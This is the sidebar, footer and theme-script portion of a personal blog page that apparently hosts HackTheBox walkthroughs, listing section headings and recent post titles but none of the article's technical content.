class="author-info-name">mdn1nj4</div><div class="author-info-description">A collection of write-ups, walkthroughs and tips of my adventures</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">54</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://twitter.com/mdn1nj4" target="_blank" title=""><i class="fab fa-twitter"></i></a><a class="social-icon" href="https://instagram.com/mohd_xdhil" target="_blank" title=""><i class="fab fa-instagram"></i></a><a class="social-icon" href="/www.linkedin.com/in/mohammed-adhil-9b05a7197" target="_blank" title=""><i class="fab fa-linkedin"></i></a><a class="social-icon" href="https://github.com/mdn1nj4" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration-amp-Initial-Access"><span class="toc-number">2.</span> <span class="toc-text">Enumeration &amp; Initial Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Result"><span class="toc-number">2.1.</span> <span class="toc-text">Nmap Scan Result</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#git-Folder-Discovery"><span class="toc-number">2.2.</span> <span class="toc-text">.git Folder Discovery</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credentials-Found"><span class="toc-number">2.3.</span> <span class="toc-text">Credentials Found</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">3.</span> <span class="toc-text">User Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">4.</span> <span class="toc-text">Root flag</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-titanic-walkthrough/" title="HackTheBox - Titanic Walkthrough">HackTheBox - Titanic Walkthrough</a><time datetime="2025-05-14T18:30:00.000Z" title="Created 2025-05-15 00:00:00">2025-05-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-underpass-walkthrough/" title="HackTheBox - UnderPass Walkthrough">HackTheBox - UnderPass Walkthrough</a><time datetime="2025-05-09T18:30:00.000Z" title="Created 2025-05-10 00:00:00">2025-05-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-nocturnal-walkthrough/" title="HackTheBox - Nocturnal Walkthrough">HackTheBox - Nocturnal Walkthrough</a><time datetime="2025-05-07T18:30:00.000Z" title="Created 2025-05-08 00:00:00">2025-05-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-dog-walkthrough/" title="HackTheBox - Dog Walkthrough">HackTheBox - Dog Walkthrough</a><time datetime="2025-05-06T18:30:00.000Z" title="Created 2025-05-07 00:00:00">2025-05-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/htb/hackthebox-jerry-walkthrough/" title="HackTheBox - Jerry Walkthrough">HackTheBox - Jerry Walkthrough</a><time datetime="2023-09-13T18:30:00.000Z" title="Created 2023-09-14 00:00:00">2023-09-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By mdn1nj4</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
